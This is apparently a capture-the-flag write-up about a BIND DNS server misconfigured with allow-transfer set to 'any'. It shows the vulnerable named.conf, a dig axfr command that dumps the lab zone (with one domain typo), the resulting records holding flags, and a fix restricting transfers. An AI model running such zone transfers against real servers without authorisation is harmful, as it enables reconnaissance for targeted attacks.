## Writeup

The project is a DNS service based on [BIND](https://en.wikipedia.org/wiki/BIND) solution with missing 
configuration issue.

In this article IP 192.168.2.5 using as example!

### Vulnerable. Missing configuration (zone transfer)

#### Summary

The main settings are located in the configuration file 'named.conf':
```
options {
    directory "/var/bind";

    version "private";

    listen-on port 53 { any; };
    listen-on-v6 { none; };

    allow-transfer { any; };
    pid-file "/var/run/named/named.pid";

    forwarders {};

    allow-recursion { none; };
    recursion no;
};


zone "rdg-ctf2023.local" {
    type master;
    file "/etc/bind/zones/rdg-ctf2023.zone";
};
```

Let's pay attention to the attribute 'allow-transfer' with value 'any'. The setting defines an address_match_list of 
hosts that are allowed to transfer the zone information from this server.

DNS zone transfers, also known as AXFR (Authoritative Zone Transfer) requests, are used to replicate and synchronize 
DNS data across multiple DNS servers. It allows a secondary DNS server to obtain a complete copy of the DNS zone from 
the primary DNS server.

When a DNS server is misconfigured and allows unrestricted zone transfers. A threat actor could perform a zone transfer 
and gain access to sensitive information, such as a list of all domain names and associated IP addresses within the zone. 
This information can be exploited for various purposes, including reconnaissance, data harvesting or targeted attacks.

In our case, this allows an attacker to take the zone 'rdg-ctf2023.local' with a single command. Use the next syntax:
```bash
dig axfr @<DNS_IP> <DOMAIN>
```
With real values:
```bash
dig axfr rdg-ctf2033.local @192.168.2.5
```

As a result, we got the contents of the zone and found the flags in the TXT resource records: 

```bash
rdg-ctf2023.local.      86400   IN      SOA     ns1.rdg-ctf2023.local. root.rdg-ctf2023.local. 439 86400 3600 604800 3600
rdg-ctf2023.local.      86400   IN      NS      ns1.rdg-ctf2023.local.
06gbOcl.rdg-ctf2023.local. 86400 IN     TXT     "DXF8EOA0IF8CJC37SJWGZ56WIP72AWW="
... <truncated> ...
0GobhwD.rdg-ctf2023.local. 86400 IN     TXT     "DNOBU4QTIDQEX46WIA596VT76XW59F3="
1fidqUM.rdg-ctf2023.local. 86400 IN     TXT     "D583O1OIRUANZVPCC2JZ1694BT80YM0="
1Qko9Yf.rdg-ctf2023.local. 86400 IN     TXT     "DSXVQ2TTD2G1M87AOKYTCIHCF2GFJNL="
```

#### How to fix?

BIND makes it possible to restrict the IPs authorized to request a zone transfer by means of the
command allow-transfer.
```bash
//named.conf
options {
    // Permits zone transfer only for 192.168.200.1
    // Also you can use value 'none;' to deny transfer for everybody
    allow-transfer { 192.168.200.1; };
}
```

But this method is not effective in a well-worked-out spoofing attack. Additional recommendations will be given 
in useful sources.

#### Useful resources

- How DNS works for beginners: https://howdns.works/
- Bind benchmarks from CIS: https://www.cisecurity.org/benchmark/bind